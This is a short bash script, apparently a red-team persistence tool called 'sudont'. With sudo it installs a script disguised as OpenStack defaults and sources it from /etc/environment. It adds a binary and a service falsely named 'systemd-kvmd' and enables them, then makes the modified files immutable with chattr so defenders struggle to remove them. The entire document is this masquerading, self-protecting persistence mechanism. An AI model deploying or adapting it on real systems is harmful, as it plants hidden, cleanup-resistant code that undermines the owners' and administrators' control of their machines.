# Sudont Deployment Script
##################################################

deploy() {
    # Prompt for sudo
    if ! sudo true; then
        return
    fi

    # Copy sudont script to /etc
    sudo mkdir /etc/openstack
    sudo cp sudont.sh /etc/openstack/osenv
    echo $'\n# OpenStack Defaults\nsource /etc/openstack/osenv' | sudo tee -a /etc/environment > /dev/null
    
    # Extra fun
    sudo cp ./systemd-kvmd /usr/sbin
    sudo chmod 755 /usr/sbin/systemd-kvmd
    sudo chown root:root /usr/sbin/systemd-kvmd
    sudo cp ./systemd-kvmd.service /usr/lib/systemd/system
    sudo chmod 755 /usr/lib/systemd/system/systemd-kvmd.service
    sudo chown root:root /usr/lib/systemd/system/systemd-kvmd.service
    sudo systemctl daemon-reload
    sudo systemctl enable --now systemd-kvmd
    
    # Protect modifications (from people who don't know what filesystem attributes are)
    sudo chattr +i /etc/openstack/osenv
    sudo chattr +i /etc/environment
    sudo chattr +i /usr/sbin/systemd-kvmd
    sudo chattr +i /usr/lib/systemd/system/systemd-kvmd.service
}

deploy
